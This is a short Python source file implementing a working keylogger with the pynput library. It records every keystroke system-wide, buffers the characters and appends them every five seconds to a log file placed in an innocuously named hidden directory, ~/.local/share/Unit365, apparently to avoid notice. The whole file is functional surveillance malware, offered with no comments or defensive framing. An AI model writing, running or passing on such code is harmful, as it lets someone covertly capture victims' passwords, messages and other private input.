import os
import time
from pynput import keyboard
from threading import Timer, Lock

buffer = []
FLUSH_INTERVAL = 5
lock = Lock()

LOG_DIR = os.path.expanduser("~/.local/share/Unit365")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "unit365.log")

special_keys = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t",
}

def on_press(key):
    with lock:
        if hasattr(key, "char") and key.char is not None:
            buffer.append(key.char)
        elif key in special_keys:
            buffer.append(special_keys[key])
        elif key == keyboard.Key.backspace and buffer:
            buffer.pop()

def write_to_file():
    with lock:
        if buffer:
            with open(LOG_FILE, "a") as f:
                f.write("".join(buffer))
            buffer.clear()
    schedule_flush()

def schedule_flush():
    Timer(FLUSH_INTERVAL, write_to_file).start()

def spawn():
    schedule_flush()
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    spawn()
